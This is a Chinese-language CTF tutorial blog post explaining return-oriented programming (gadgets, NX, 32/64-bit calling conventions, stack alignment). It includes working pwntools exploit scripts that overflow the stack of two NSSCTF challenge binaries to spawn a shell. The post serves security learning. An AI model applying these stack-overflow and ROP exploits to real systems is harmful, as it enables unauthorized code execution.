---
title: Pwn-ROP
description: pwn-第2部分ROP
date: 2026-05-17 16:12:12
updated: 2026-05-17 16:12:12
image: https://images.cnblogs.com/cnblogs_com/blogs/860797/galleries/2492655/o_260223065253_12.webp
categories: [pwn, 安全]
tags: [pwn]
recommend: 10
---



## PWN-ROP

---

### 什么是ROP

> **为什么会诞生 ROP？（被逼出来的绝招）**
>
> 在早期，黑客的攻击方式简单粗暴：往栈上注入一段自己写的恶意代码（Shellcode），然后把返回地址改成这段代码的地址，直接执行。
>
> 后来安全专家怒了，开启了 **NX 保护**，规定栈上的数据“**只能读写，不能执行**”。黑客辛辛苦苦写进去的 Shellcode 变成了废纸。
>
> 既然“不能带枪进门”，黑客就改变了思路：“**那我就用你屋子里的锅碗瓢盆，当场拼一把枪出来。**” 这就是 ROP。ROP 的核心思想是：**不注入新代码，而是利用程序原有的代码片段来实现攻击。**

> **核心概念：Gadget（代码片段）和报纸勒索信**
>
> 程序编译后，内存里有大量的合法指令。黑客会在这些合法代码中寻找极其短小的片段，这些片段必须满足一个条件：**以 `ret` 指令结尾**。这些片段被称为 **Gadget**。
>
> - 比如：`pop eax; ret`
> - 比如：`pop edi; ret`
>
> 你可以把 ROP 想象成**电影里的绑匪写勒索信**：绑匪为了不暴露笔迹，不会自己写字，而是从旧报纸上剪下单字（**Gadget**），然后按顺序贴在纸上（**构造栈 Payload**），最后拼凑出一句原本报纸上根本没有的话：“给我打钱（`system("/bin/sh")`）”。

> **ROP 是如何运行起来的？**
>
> 正常的程序，是靠指令寄存器（EIP/RIP）不断指向下一条指令来运行的。 而在 ROP 中，**程序的执行引擎变成了栈指针（ESP/RSP）**。
>
> 这全靠 **`ret`** 指令的魔法：
> 1. **`ret`** 的本质是 **`pop EIP`**，也就是把栈顶的数据弹出来，当作下一条要执行的代码地址。
> 2. 当你通过溢出劫持了程序的执行流后，你把多个 Gadget 的地址和需要的参数，像糖葫芦一样串在栈上（这就是所谓的 **ROP 链**）。
> 3. 程序执行完第一个 Gadget 后，遇到 `ret`，就会自动去栈上拿下一个 Gadget 的地址接着执行。
> 4. 就这样，`ret` 指令像接力棒一样，引导程序在栈上不断跳跃，执行完一个片段再跳到下一个，最终完成连贯攻击。

小技巧，如果还可以使用cyclic 200生成一长串字符串，在gdb里边直接找首个8字节数，利用cyclic -l "字符串"找到目标

---

### [NISACTF 2022]ezstack

比赛链接：https://www.nssctf.cn/problem/2057

依旧三步走

![image-20260426145841742](https://img2024.cnblogs.com/blog/3726946/202604/3726946-20260426214243005-1974650957.png)

---

#### NX保护

> **NX 保护 (No-eXecute)**
> NX（在 Windows 中称为 DEP）针对的是**内存权限**。
> - **它的作用：** 它的核心机制是将内存的某些区域（例如栈、堆、BSS段）标记为“不可执行”（Non-Executable）。
> - **防御效果：** 开启 NX 后，即使你成功把代码写入了栈，并且控制程序跳了过去，CPU 一旦发现这块内存没有“执行”权限，就会直接报错并引发程序崩溃（Segmentation fault）。

主函数main
![image-20260426150135362](https://img2024.cnblogs.com/blog/3726946/202604/3726946-20260426214242395-1062387693.png)

shell()函数
![image-20260426150222298](https://img2024.cnblogs.com/blog/3726946/202604/3726946-20260426214241982-400779443.png)

发现 **system** 调用
然后出现了 **read** 函数读取范围超过了 buf 数组范围,存在 **栈溢出**, 那就是缺少一个 bin/sh 就能构成 shellcode

![image-20260426150357134](https://img2024.cnblogs.com/blog/3726946/202604/3726946-20260426214241575-871337921.png)发现/bin/sh存在该地址下

那思路就是
```python
payload = b'a'*72 + p32(system_addr)+p32(bin_addr)
```

---

#### 32位系统下对system函数调用的不同区别

动画:[HACKED笔记pwn/动画链接/NSSCTF-PWN/栈/[NISACTF 2022\]ezstack/p32位系统system_call不同区别payload不同用法.html · 工程部Teddy Bear/网络安全 - 码云 - 开源中国](https://gitee.com/ASUS_HACKED/cybersecurity/blob/比赛附件/HACKED笔记pwn/动画链接/NSSCTF-PWN/栈/[NISACTF 2022]ezstack/p32位系统system_call不同区别payload不同用法.html)

> **32位系统下对system函数调用的不同区别**
> 在 32 位系统里，**system** 函数处理工作时，看办公桌（**栈指针 ESP**）有严格的顺序要求：
> - **桌子最上面（ESP）：** 必须是一张写着“办完事回哪去”的条子（返回地址）。
> - **往下数一格（ESP+4）：** 才是要执行的具体文件（也就是我们的参数 `/bin/sh`）。

**方法一：传统打法 —— 直接找老板 (`system@plt`)**
如果你在 Payload 中直接填入 `system` 函数的真正入口点（比如 `system@plt`），就相当于你直接推门进去找老板办事。老板会死板地按照规矩看桌子。如果你不主动放一张“无关地址”的条子垫在中间，老板会把 `/bin/sh` 当成“返回地址”，最后程序崩溃。

**传统的栈布局（必须手动加垫片）：**

```
[ 栈顶 ESP ] -> 0xdeadbeef (你必须手动塞入的假返回地址，骗过老板的第一眼)
[ ESP + 4 ]  -> 0x0804A024 (真实的参数 /bin/sh，放在老板看第二眼的位置)
```

**方法二：你的高阶打法 —— 找秘书代办 (`call system`)**
你 Payload 里找的地址是一条 **`call system`** 的汇编指令。汇编里的 `call` 指令有一个极其重要且自动的隐藏动作：**它在去找函数之前，会自动把当前的返回地址压到栈顶。** 因为秘书帮你完成了垫条子的动作，你提前放在栈上的 `/bin/sh`，就极其完美地被向下挤了一格，刚好落在了老板眼中的“第二眼”位置！

---

#### Exploit 代码

```python
from pwn import *
r = process("./pwn")
##r = remote("node5.anna.nssctf.cn",21304)
context(os='linux',arch='i386',log_level='debug')
offset = 0x48+0x4
##return_address = 0x08048503
system_address = 0x08048512
bin_sh_address = 0x0804A024

payload = b'a'*offset+p32(system_address)+p32(bin_sh_address)
##gdb.attach(r)
r.sendline(payload)
r.interactive()
```

---

### [GFCTF 2021]where_is_shell

题目连接:https://www.nssctf.cn/problem/889

查看保护机制
![image-20260429125727704](https://img2024.cnblogs.com/blog/3726946/202604/3726946-20260429185019461-1704129402.png)

在IDA看看有什么东西
![image-20260429130037145](https://img2024.cnblogs.com/blog/3726946/202604/3726946-20260429185019091-864931033.png)
![image-20260429130046386](https://img2024.cnblogs.com/blog/3726946/202604/3726946-20260429185018129-1407487080.png)
![image-20260429130105670](https://img2024.cnblogs.com/blog/3726946/202604/3726946-20260429185018484-434819074.png)

通过字符串搜索我们知道这题并没有出现我们的/bin/sh，说明这题并不是简单的栈溢出。**read** 读取了 0x38ull，远远超过 10h，出现了 **栈溢出**。

找一下system的地址:
- `0x40055C` -> `call _system`
- `0x400430` -> `system@plt` 入口

---

#### 垫片ret

[栈对齐动画](https://gitee.com/ASUS_HACKED/cybersecurity/blob/比赛附件/HACKED笔记pwn/动画链接/NSSCTF-PWN/栈/[SWPUCTF 2021 新生赛]gift_pwn/PWN 栈对齐.html)

> **栈对齐与 ret 垫片**
> 64 位的 **system** 函数有一道严格的安检门：进入它时，**`rsp` 的地址必须是 16 字节对齐的（末尾为 0）**。而在 ROP 链中，`rsp` 往往是错位的（末尾为 8）。如果直接跳进 `system`，程序就会因为 `movaps` 指令当场崩溃。为了弄平堆栈，我们需要强行插入一个只包含 **`ret`** 指令的地址作为垫片。

---

#### 不同system_call的区别(64位)

- **形态一：跳向代码段的 `call _system`**
  - 底层原理：`call` 指令硬件级微操是 `push rip; jmp`。
  - 结论：**【绝对不能加垫片】**。它自带了一块完美的垫片。

- **形态二：跳向 PLT 表的 `system@plt`**
  - 底层原理：PLT 表内部使用的是 **`jmp` 指令**，绝对不触碰堆栈。
  - 结论：**【必须加垫片】**。

- **形态三：跳向 `libc` 中的 `system` 真实地址**
  - 结论：**【必须加垫片】**。

- **形态四：跳向“带 Shell 的函数正开头”**
  - 结论：**【必须加垫片】**。

---

#### `$0` 的妙用

还记得这张图片吗？
![image-20260429130046386](https://img2024.cnblogs.com/blog/3726946/202604/3726946-20260429185018129-1407487080.png)

在汇编中，它会这么显示：![image-20260429132044053](https://img2024.cnblogs.com/blog/3726946/202604/3726946-20260429185017615-1568430952.png)

> **为什么传 `$0` 能拿到 Shell？**
> 十六进制的 **`\x24\x30\x00`** 对应的 ASCII 字符正是 **`$0\0`**。在 Linux Shell 中，**`$0`** 代表当前程序的名称。调用 `system("$0")` 底层等同于呼叫系统执行 `sh`，从而派生出一个交互式 Shell。

---

#### pop rdi;ret 作用

> **64位传参约定：**
> 函数不再从栈上找参数，而是看寄存器。第一个参数必须放在 **`rdi`**。
> - **`pop rdi`：** 像机械手一样从栈上抓取地址并塞进 `rdi` 口袋。
> - **`ret`：** 紧接着跳向 `system` 函数入口。

找找我们的 **pop rdi ; ret**：
![image-20260429133612264](https://img2024.cnblogs.com/blog/3726946/202604/3726946-20260429185016984-1798367405.png)

---

#### Exploit 代码

```python
## call _system 方式
from pwn import *
context(os = 'linux', arch = 'amd64', log_level = 'debug')

##r = process('./shell')
r = remote("node4.anna.nssctf.cn", 25607) 
offset = 0x10+0x8
pop_rdi_ret = 0x4005e3
ret_addr = 0x40057d
system_addr = 0x400557
shell_addr = 0x400541
payload = offset * b'a'+p64(pop_rdi_ret) + p64(shell_addr)  + p64(system_addr)

r.sendline(payload)
r.interactive()
```

```md wrap
<!-- 你可以在此处书写大纲，并在上方完成文章 -->
```

